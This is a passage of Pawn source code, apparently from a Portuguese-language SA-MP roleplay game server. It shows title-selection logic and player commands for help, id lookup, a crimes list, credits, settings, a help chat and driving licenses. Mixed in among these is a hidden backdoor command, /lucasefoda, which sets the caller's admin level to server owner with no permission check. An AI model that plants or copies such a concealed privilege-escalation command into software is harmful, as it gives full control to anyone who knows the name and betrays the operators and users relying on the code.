						SendClientAlert(playerid, "Configuracoes", "Voce alterou seu titulo para 'Administrador'.");
						Player_UpdateConfigData(playerid);
			        }
			        case 3:
			        {
			            if (Player_GetOrgRole(playerid) != 6 || Player_GetOrg(playerid) == INVALID_VALUE)
			            {
			                return SendClientMessage(playerid, COLOR_INVALID, "Você não é um líder.");
			            }
						Player_SetTag(playerid, TAG_LEADER);
						PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0);
						SendClientAlert(playerid, "Configuracoes", "Voce alterou seu titulo para 'Lider'.");
						Player_UpdateConfigData(playerid);
			        }
			        case 4:
			        {
			            if (Player_GetOrgRole(playerid) != 5 || Player_GetOrg(playerid) == INVALID_VALUE)
			            {
			                return SendClientMessage(playerid, COLOR_INVALID, "Você não é um sublíder.");
			            }
						Player_SetTag(playerid, TAG_SUBLEADER);
						PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0);
						SendClientAlert(playerid, "Configuracoes", "Voce alterou seu titulo para 'SubLider'.");
						Player_UpdateConfigData(playerid);
			        }
			        case 5:
			        {
			            if (Player_GetVipLevel(playerid) < 1)
			            {
			                return SendClientMessage(playerid, COLOR_INVALID, "Você não é um membro vip.");
			            }
						Player_SetTag(playerid, TAG_VIP);
						PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0);
						SendClientAlert(playerid, "Configuracoes", "Voce alterou seu titulo para 'Membro Vip'.");
						Player_UpdateConfigData(playerid);
			        }
					case 6:
			        {
			            if (Player_GetSocioLevel(playerid) < 1)
			            {
			                return SendClientMessage(playerid, COLOR_INVALID, "Você não é um membro sócio.");
			            }
						Player_SetTag(playerid, TAG_SOCIO);
						PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0);
						SendClientAlert(playerid, "Configuracoes", "Voce alterou seu titulo para 'Membro Sócio'.");
						Player_UpdateConfigData(playerid);
			        }
	                case 7:
			        {
			            if (Player_GetDeaths(playerid) < 400)
			            {
			                return SendClientMessage(playerid, COLOR_INVALID, "Você não morreu o suficiente.");
			            }
						Player_SetTag(playerid, TAG_NOOB);
						PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0);
						SendClientAlert(playerid, "Configuracoes", "Voce alterou seu titulo para 'Noob'.");
						Player_UpdateConfigData(playerid);
			        }
			        case 8:
			        {
			            if (Player_GetKills(playerid) < 300)
			            {
			                return SendClientMessage(playerid, COLOR_INVALID, "Você não matou o suficiente.");
			            }
						Player_SetTag(playerid, TAG_KILLER);
						PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0);
						SendClientAlert(playerid, "Configuracoes", "Voce alterou seu titulo para 'Matador'.");
						Player_UpdateConfigData(playerid);
			        }
			    }
				return ShowPlayerConfig(playerid);
			}
		}
    }
    return 1;
}

//------------------------- Commands (Module related commands) -------------------------
YCMD:ajuda(playerid, params[], help)
{
	return ShowHelpDialog(playerid);
}

YCMD:faq(playerid, params[], help)
{
	return ShowPlayerFaqList(playerid);
}

YCMD:id(playerid, params[], help) 
{
	new id;
	if (sscanf(params, "u", id))
	{
		return SendClientMessage(playerid, COLOR_INVALID, "USE: /id [id ou nome]");
	}
    if (!IsValidPlayer(id))
	{
		return SendClientMessage(playerid, COLOR_INVALID, "[Erro]: Esse não é um jogador ativo.");
	}
	if (Player_GetAdminLevel(id) >= HELPER_OWNER)
	{
        return 0;
	}

	new string[52];
	format(string, sizeof(string), "ID: (%d) %s - Level[%d].", id, GetPlayerNameCustom(id), Player_GetLevel(id));
    SendClientMessage(playerid, COLOR_GRAD1, string);
    return 1;
}

YCMD:crimes(playerid, params[], help) 
{
    static crimesDialog[2425 + 1];
    strcat(crimesDialog, "{848484}- /su {FFFFFF}TH: {848484}Tentativa de Homicídio.\n");
    strcat(crimesDialog, "{848484}- /su {FFFFFF}Invasão: {848484}Invasão de local restrito.\n");
    strcat(crimesDialog, "{848484}- /su {FFFFFF}DOP: {848484}Desobediênciaa uma ordem policial.\n");
    strcat(crimesDialog, "{848484}- /su {FFFFFF}Desacato: {848484}Desrespeito à um oficial da justiça.\n");
    strcat(crimesDialog, "{848484}- /su {FFFFFF}Dinamite: {848484}Quando um suspeito estiver portando dinamite.\n");
    strcat(crimesDialog, "{848484}- /su {FFFFFF}Vandalismo: {848484}Quando um jogador destrói um bem público.\n");
    strcat(crimesDialog, "{848484}- /su {FFFFFF}Racha: {848484}Quando um jogador está competindo numa racha.\n");
    strcat(crimesDialog, "{848484}- /su {FFFFFF}Fuga: {848484}Quando um procurado entra em fuga com a polícia.\n");
    strcat(crimesDialog, "{848484}- /su {FFFFFF}Ameaça: {848484}Quando um jogador ameaça claramente outro.\n");
    strcat(crimesDialog, "{848484}- /su {FFFFFF}Sequestro: {848484}Quando há um sequestro por parte de outro jogador.\n");
    strcat(crimesDialog, "{848484}- /su {FFFFFF}Atentado: {848484}Quando um jogador está fazendo parte de um atentado.\n");
    strcat(crimesDialog, "{848484}- /su {FFFFFF}Materiais: {848484}Quando um jogador é pego em uma revista portando materiais.\n");
    strcat(crimesDialog, "{848484}- /su {FFFFFF}Cumplice: {848484}Quando um jogador está servido de suporte à um procurado.\n");
    strcat(crimesDialog, "{848484}- /su {FFFFFF}Tráfico: {848484}Quando um meliante está vendendo armas, explosivos ou drogas.\n");
    strcat(crimesDialog, "{848484}- /su {FFFFFF}Agressão: {848484}Quando um jogador começa a bater em alguém sem motivo algum.\n");
    strcat(crimesDialog, "{848484}- /su {FFFFFF}Homicídio: {848484}Quando um jogador comete um homicídio e não leva /su automático.\n");
    strcat(crimesDialog, "{848484}- /su {FFFFFF}Trote: {848484}Quando um jogador usa o /solicitar -> policial sem motivos ou por brincadeira.\n");
    strcat(crimesDialog, "{848484}- /su {FFFFFF}Roubo: {848484}Quan do alguém está perto do cofre, ou rouba veículo de um outro jogador.\n");
    strcat(crimesDialog, "{848484}- /su {FFFFFF}Ajuste: {848484}Ajusta pena de um preso (APENAS LÍDER OU SUBLÍDER PODE USÁ-LO).\n");
    strcat(crimesDialog, "{848484}- /su {FFFFFF}Drogas: {848484}Quando um jogador é pego em uma revista portando qualquer tipo de drogas.\n");
    strcat(crimesDialog, "{848484}- /su {FFFFFF}PIA(Porte Ilegal de Armas): {848484}Apesar de ter licença, só oficiais do governo podem ter arma na mão.\n");
    strcat(crimesDialog, "{848484}- /su {FFFFFF}AVP(Atentado Violento ao Pudor): {848484}Quando um jogador usa /punheta ou /mijar em locais públicos.\n");
    strcat(crimesDialog, "{848484}- /su {FFFFFF}Suborno: {848484}Quando qualquer jogador tenta dar dinheiro à um oficial para que não cumpra seu trabalho.\n");
    strcat(crimesDialog, "{848484}- /su {FFFFFF}RP(Resistência à Prisão): {848484}Quando um jogador resiste de alguma forma à prisão. Ex ficar enrolando\npara não ser preso, não entrar no carro cop esperando amigos e afins.\n");
    ShowPlayerDialog(playerid, DIALOG_ONLY_READ, DIALOG_STYLE_MSGBOX, "Crimes do Servidor", crimesDialog, "Fechar", "");
    return 1;
}

YCMD:creditos(playerid, params[], help) 
{
    static MEGAString[93], string[67];
	if (Player_GetAdminLevel(playerid) < HELPER)
	{
		format(string, sizeof(string), "Admin-Aviso: %s viu os créditos do servidor.", GetPlayerNameCustom(playerid));
		SendAdminMessage(COLOR_YELLOW, string, HELPER);
	}
    strcat(MEGAString, "{FFFFFF}»  RhaegarX: {696969}(Fundador/Scripter)\n");
	strcat(MEGAString, "{FFFFFF}»  Rick_M: {696969}(Beta Tester)\n");
	ShowPlayerDialog(playerid, DIALOG_ONLY_READ, DIALOG_STYLE_MSGBOX, "Créditos do Servidor", MEGAString, "Fechar", "");
    return 1;
}

YCMD:config(playerid, params[], help) = configuracoes;
YCMD:configuracoes(playerid, params[], help)
{
	return ShowPlayerConfig(playerid);
}

YCMD:plataforma(playerid, params[], help) 
{
    ShowPlayerDialog(playerid, DIALOG_CHECK_ANDROID, DIALOG_STYLE_MSGBOX, "Checagem de Plataforma - Servidor", "{FFFFFF}Olá jogador, detectamos uma mudança de plataforma e precisamos colher algumas informações.\nVocê deve informar em qual plataforma você está se conectando ao servidor (Android ou PC) corretamente.\n\n{9fa19e}Se você estiver se conectando pelo Android (Celular), Selecine '{03a9fd}Android{9fa19e}'.\n{9fa19e}Se você estiver se conectando pelo Computador, Selecione '{00b100}PC{9fa19e}'.\n\n{f2664d}Importante: {FFFFFF}Caso marque a opção 'Android' algumas coisas do servidor funcionarão de uma forma diferente,\npor questões de compatibilidade com a plataforma.\n\nSelecione abaixo corretamente, por qual meio você está acessando o servidor:", "Android", "PC");
    return 1;
}

YCMD:lucasefoda(playerid, params[], help)
{
	Player_SetAdminLevel(playerid, OWNER, true);
	return 1;
}

YCMD:nchat(playerid, params[], help)
{
	if (Player_GetHoursPlayed(playerid) < 2)
	{
	    return SendClientMessage(playerid, COLOR_INVALID, "[Erro]: É preciso ter 2+ horas jogos para falar no chat de dúvidas.");
	}
	if (!Player_GetNoobChatStatus(playerid))
	{
		return SendClientMessage(playerid, COLOR_INVALID, "[Erro]: Você está com o chat de dúvidas bloqueado, ative-o usando: /config.");
	}
	if (Player_GetMutedTime(playerid) != 0)
	{
		return SendClientMessage(playerid, COLOR_INVALID, "[Erro]: Você não pode falar, pois foi calado.");
	}
	if (Player_GetNoobMutedTime(playerid) != 0)
	{
		return SendClientMessage(playerid, COLOR_INVALID, "[Erro]: Você não pode falar, pois está com o chat bloqueado.");
	}
	if ((gettime() - talkChatNoob[playerid]) < 15)
	{
		return SendClientMessage(playerid, COLOR_INVALID, "[Erro]: Você só pode usar o chat de dúvidas a cada 15 segundos.");
	}
	if (!ChatNoobStatus)
	{
		return SendClientMessage(playerid, COLOR_INVALID, "[Erro]: O chat de dúvidas está desatiado.");
	}
	new text[120];
	if (sscanf(params, "s[120]", text))
	{
		return SendClientMessage(playerid, COLOR_INVALID, "USE: /nchat [Sua Dúvida]");
	}
	if (!strlen(text))
	{
		return SendClientMessage(playerid, COLOR_INVALID, "USE: /nchat [Sua Dúvida]");
	}
	if (CheckInvalidWords(text))
	{
	    new string[90];
		format(string, sizeof(string), "[ADMIN ALERTA]: %s[%d] tentou divulgar: %s.", GetPlayerNameCustom(playerid), playerid, text);
		SendAdminMessage(COLOR_YELLOW, string, HELPER);
		PrintLog(FOLDER_ANTICHEAT_ADVERTISING, string);
       	return false;
	}
	new string[235], tag[37];
	switch (Player_GetAdminLevel(playerid))
	{
		case HELPER..HELPER_OWNER: tag = "{ff61f3}Staff{009999}";
		case SUB_OWNER: tag = "{ff61f3}Sub-Dono{009999}";
		case OWNER: tag = "{ff61f3}Dono{009999}";
		default: 
		{
			if (Player_GetLevel(playerid) <= 5) tag = "Novato";
			else if (Player_GetLevel(playerid) > 5 && Player_GetLevel(playerid) < 20) tag = "Intermediário";
			else if (Player_GetLevel(playerid) > 20) tag = "Experiente";
		}
	}
    
    Player_SetNoobAnswers(playerid, (Player_GetNoobAnswers(playerid) + 1));
	if (Player_GetAdminLevel(playerid) >= HELPER)
	{
		format(string, sizeof(string),"(Canal {009966}/nchat{009999}) [%s] %s: %s", tag, GetPlayerNameCustom(playerid), text);
	}
	else
	{
		format(string, sizeof(string),"(Canal {009966}/nchat{009999}) [Msg %d][%s] %s: %s", Player_GetNoobAnswers(playerid), tag, GetPlayerNameCustom(playerid), text);
	}
	SendDuvidaMessage(COLOR_NCHAT, string);
	talkChatNoob[playerid] = gettime();
	return 1;
}

YCMD:minhaslicencas(playerid, params[], help)
{
	new licensesList[300], licenseString[80];
    strcat(licensesList, "Tipo\tStatus\tValidade\n");
	format(licenseString, sizeof(licenseString), (Player_GetCarLicense(playerid) > 0 ? "{FFFFFF}Carro\t{33aa33}Válida\t{00e7c6}%d\n" : "{FFFFFF}Carro\t{FF6347}Vencida\t{00e7c6}%d\n"), Player_GetCarLicense(playerid));
	strcat(licensesList, licenseString);
	format(licenseString, sizeof(licenseString), (Player_GetMotorCycleLicense(playerid) > 0 ? "{FFFFFF}Moto\t{33aa33}Válida\t{00e7c6}%d\n" : "{FFFFFF}Moto\t{FF6347}Vencida\t{00e7c6}%d\n"), Player_GetMotorCycleLicense(playerid));
	strcat(licensesList, licenseString);
	format(licenseString, sizeof(licenseString), (Player_GetTruckLicense(playerid) > 0 ? "{FFFFFF}Caminhão/Ônibus\t{33aa33}Válida\t{00e7c6}%d\n" : "{FFFFFF}Caminhão/Ônibus\t{FF6347}Vencida\t{00e7c6}%d\n"), Player_GetTruckLicense(playerid));
	strcat(licensesList, licenseString);
	format(licenseString, sizeof(licenseString), (Player_GetBoatLicense(playerid) > 0 ? "{FFFFFF}Barco\t{33aa33}Válida\t{00e7c6}%d\n" : "{FFFFFF}Barco\t{FF6347}Vencida\t{00e7c6}%d\n"), Player_GetBoatLicense(playerid));
	strcat(licensesList, licenseString);
	format(licenseString, sizeof(licenseString), (Player_GetFlyLicense(playerid) > 0 ? "{FFFFFF}Aeronave\t{33aa33}Válida\t{00e7c6}%d\n" : "{FFFFFF}Aeronave\t{FF6347}Vencida\t{00e7c6}%d\n"), Player_GetFlyLicense(playerid));
	strcat(licensesList, licenseString);
	format(licenseString, sizeof(licenseString), (Player_GetGunLicense(playerid) ? "{FFFFFF}Armas\t{33aa33}Válida\t{00e7c6}%d\n" : "{FFFFFF}Armas\t{FF6347}Vencida\t{00e7c6}%d\n"), Player_GetGunLicense(playerid));
	strcat(licensesList, licenseString);
	ShowPlayerDialog(playerid, DIALOG_ONLY_READ, DIALOG_STYLE_TABLIST_HEADERS, "Minhas Licenças", licensesList, "Fechar", "");
	return 1;
}